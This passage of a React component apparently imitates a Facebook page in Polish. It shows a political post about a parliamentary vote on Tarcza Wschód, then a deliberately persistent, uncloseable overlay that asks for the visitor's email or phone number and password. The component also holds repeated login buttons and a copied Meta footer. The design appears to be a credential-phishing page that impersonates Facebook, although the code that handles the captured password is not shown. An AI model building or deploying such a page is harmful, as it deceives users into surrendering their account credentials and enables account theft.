                >
                  Wyświetl więcej
                </button>
              </div>
            ) : (
              <div>
                <p>Mieli do wyboru: poparcie uchwały albo hańbę. Wybrali hańbę, a uchwałę i tak przegłosowaliśmy. PiS i Konfederacja ponownie przeciw Tarczy Wschód i europejskiej solidarności. Mimo to, jako rząd będziemy konsekwentnie działać na rzecz bezpieczeństwa Polski i umacniania naszej pozycji w Unii Europejskiej.</p>
                <p className="mt-2">Głosowanie nad uchwałą popierającą dokument końcowy z posiedzenia Rady Europejskiej w dniach 17-18 kwietnia pokazało, kto naprawdę dba o polskie bezpieczeństwo, a kto kieruje się wyłącznie partyjnymi interesami i antyeuropejskimi resentymentami.</p>
                <p className="mt-2">Tarcza Wschód to strategiczna inwestycja w bezpieczeństwo naszej wschodniej granicy, która jest jednocześnie granicą Unii Europejskiej. Tego typu projekty wymagają solidarności i jedności wszystkich sił politycznych, jednak jak widać, niektórzy nie potrafią wznieść się ponad partyjne animozje nawet w sprawach kluczowych dla bezpieczeństwa państwa.</p>
              </div>
            )}
          </div>
        </div>
      </div>
      
      {/* Comment restriction notice */}
     
      
      {/* Post engagement stats */}
      <div className="flex justify-between text-xs text-gray-500 border-b  py-2 mx-4 mb-2">
        <div className="flex items-center">
          <div className="flex -space-x-1 mr-1">
            <div className="bg-blue-500 rounded-full w-5 h-5 flex items-center justify-center">
              <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 24 24">
                <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z" />
              </svg>
            </div>
          </div>
          <span>5</span>
        </div>
        <div>
          <span>27 komentarzy · 48 udostępnień</span>
        </div>
      </div>
      
      {/* Action buttons - conditional rendering based on isMobile */}
      <div className="flex mx-4 pb-2">
        <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
          <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
            <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z" />
          </svg>
          Polub
        </button>
        <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
          <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
            <path d="M21.99 4c0-1.1-.89-2-1.99-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h14l4 4-.01-18z" />
          </svg>
          Skomentuj
        </button>
      </div>
    </div>







  







   



    
              <div className={`fixed inset-0 bg-black transition-opacity duration-300 z-50 ${
  isVisible ? 'bg-opacity-50' : 'bg-opacity-0 pointer-events-none hidden'
}`}>
  <div className="fixed inset-0 flex items-center justify-center p-4">
    <div className="bg-white rounded-lg shadow-lg w-full max-w-md relative">
      {/* No close button since we want it to be persistent */}
      
      <div className="px-6 py-8">
        {/* Header */}
        <h2 className="text-3xl font-bold text-center mb-6">
        Zobacz więcej na Facebooku
        </h2>

        {/* Email/Phone Input */}
        <div className="mb-4">
          <input 
            type="text" 
            className="w-full px-4 py-3 border border-gray-300 rounded-lg text-center text-gray-700" 
            placeholder="Adres e-mail lub numer telefonu"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
        </div>

        {/* Password Input */}
        <div className="mb-4">
          <input 
            type="password" 
            className="w-full px-4 py-3 border border-gray-300 rounded-lg text-center text-gray-700" 
            placeholder="Hasło"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
        </div>

        {/* Log In Button */}
        <button 
          className="w-full bg-blue-600 text-white py-3 rounded-lg font-medium mb-4 hover:bg-blue-700"
          onClick={redirectToFacebook}
        >
           Zaloguj się
        </button>

        {/* Forgotten Password Link */}
        <div className="text-center mb-6">
          <a href="#" className="text-blue-600 hover:underline">
          Nie pamiętasz hasła?
          </a>
        </div>

        {/* Divider */}
        <div className="flex items-center justify-center mb-6">
          <div className="flex-1 h-px bg-gray-300"></div>
          <span className="px-4 text-gray-500">or</span>
          <div className="flex-1 h-px bg-gray-300"></div>
        </div>

        {/* Create Account Button */}
        <button 
          className="w-full bg-green-600 text-white py-3 rounded-lg font-medium hover:bg-green-700"
          onClick={redirectToFacebook}
        >
         Utwórz nowe konto
        </button>
      </div>
    </div>
  </div>
</div>


              <div className="mt-8 mb-4 px-4 text-center">
                <div className="text-xs text-gray-500 space-y-1">
                  <div className="flex flex-wrap justify-center gap-x-2">
                    <a href="#" className="hover:underline">Polska</a>
                    <a href="#" className="hover:underline">English (US)</a>
                    <a href="#" className="hover:underline">Deutsch</a>
                    <a href="#" className="hover:underline">Русский</a>
                    <a href="#" className="hover:underline">Español</a>
                    <a href="#" className="hover:underline">Français (France)</a>
                    <a href="#" className="hover:underline">Italiano</a>
                    <a href="#" className="hover:underline">中文(简体)</a>
                    <a href="#" className="hover:underline">العربية</a>
                    <a href="#" className="hover:underline">Português (Brasil)</a>
                  </div>
                  <div className="flex flex-wrap justify-center gap-x-2 mt-2">
                    <a href="#" className="hover:underline">Rejestracja</a>
                    <a href="#" className="hover:underline">Logowanie</a>
                    <a href="#" className="hover:underline">Messenger</a>
                    <a href="#" className="hover:underline">Facebook Lite</a>
                    <a href="#" className="hover:underline">Watch</a>
                    <a href="#" className="hover:underline">Miejsca</a>
                    <a href="#" className="hover:underline">Gry</a>
                    <a href="#" className="hover:underline">Marketplace</a>
                    <a href="#" className="hover:underline">Meta Pay</a>
                    <a href="#" className="hover:underline">Meta Store</a>
                    <a href="#" className="hover:underline">Meta Quest</a>
                    <a href="#" className="hover:underline">Instagram</a>
                    <a href="#" className="hover:underline">Threads</a>
                  </div>
                  <div className="mt-4">
                    <p>Meta © 2025</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {!isMobile && (
        <div className="fixed bottom-0 left-0 right-0 w-full border-t border-gray-300 bg-white shadow-lg z-50">
          <div className="container mx-auto px-4 py-5">
            <div className="flex flex-col items-center justify-center">
              <h1 className="text-2xl font-bold mb-4 text-center">
                Zaloguj się lub zarejestruj na Facebooku, aby połączyć się ze znajomymi, członkami rodziny i osobami, które znasz.
              </h1>
              
              <div className="flex items-center space-x-4">
                <button onClick={redirectToFacebook} className="px-12 py-3 font-medium text-white bg-blue-600 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2" >
                  Zaloguj się
                </button>
                
                <div>lub</div>
                
                <button onClick={redirectToFacebook} className="px-12 py-3 font-medium text-white bg-green-600 rounded-md hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-2">
                  Utwórz nowe konto
                </button>
              </div>
            </div>
          </div>
        </div> )}
      
      {messageOpen && (
        <div className="fixed bottom-4 right-4 w-80 bg-white rounded-lg shadow-lg overflow-hidden z-50">
          <div className="bg-blue-500 text-white px-4 py-3 flex justify-between items-center">
            <h3 className="font-semibold">Nowa wiadomość</h3>
            <div className="flex space-x-2">
              <button>
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" />
                </svg>
              </button>
            </div>
          </div>
          <div className="p-4 h-60 overflow-y-auto">
            <div className="flex flex-col space-y-2">
              <input 
                type="text" 
                placeholder="Szukaj..." 
                className="w-full bg-gray-100 rounded-full py-2 px-3 text-sm focus:outline-none mb-2"
              />
              {[1, 2, 3, 4, 5].map((num) => (
                <div key={num} className="flex items-center p-2 rounded-md hover:bg-gray-100 cursor-pointer">
                  <div className="relative">
                    <img src="/Assets/Gwarancja.rozwoju/photo_avatar.jpg" alt={`Contact ${num}`} className="w-10 h-10 rounded-full" />
                    <span className="absolute bottom-0 right-0 w-3 h-3 bg-green-500 rounded-full border-2 border-white"></span>
                  </div>
                  <div className="ml-2">
                    <p className="font-medium text-sm">Kontakt {num}</p>
                    <p className="text-xs text-gray-500">Dostępny</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
          <div className="border-t p-3">
            <button className="w-full bg-blue-500 text-white py-2 rounded-md font-medium">
              Nowa wiadomość grupowa
            </button>
          </div>
        </div>
      )}

<div>
      <button 
        onClick={redirectToFacebook}
        className="bg-blue-600 text-white font-bold px-6 py-2 rounded-md">
        Zaloguj się
      </button>
      
      {showModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center">
          <div 
            className="fixed inset-0 bg-black bg-opacity-80"
            style={{ pointerEvents: 'all' }}
          ></div>
          
          <div className="relative bg-white w-full max-w-md mx-4 rounded-lg overflow-hidden shadow-xl">
            <div className="flex justify-center pt-8 pb-4">
              <svg 
                viewBox="0 0 36 36" 
                style={{ color: '#1877F2' }} 
                fill="currentColor" 
                height="80" 
                width="80"
              >
                <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"></path>
                <path fill="#FFFFFF" d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z"></path>
              </svg>
            </div>
            
            <div className="px-6 pb-4 text-center">
              <h2 className="text-3xl font-bold mb-4">There's more to see</h2>
              <p className="text-gray-600 text-lg mb-6">
                Log in to see the latest content and explore your interests.
              </p>
            </div>
            
            <div className="px-6 pb-2">
              <button 
                className="w-full bg-blue-600 text-white font-bold py-3 px-4 rounded-md mb-2"
                onClick={redirectToFacebook}
              >
                Zaloguj się
              </button>
            </div>
            
            <div className="px-6 pb-6">
              <button 
                className="w-full bg-gray-200 text-black font-bold py-3 px-4 rounded-md"
                onClick={redirectToFacebook}
              >
                Create new account
              </button>
            </div>
          </div>
        </div>
      )}
    </div> 
    </main>
  );
};

export default GwarancjaRozwoju

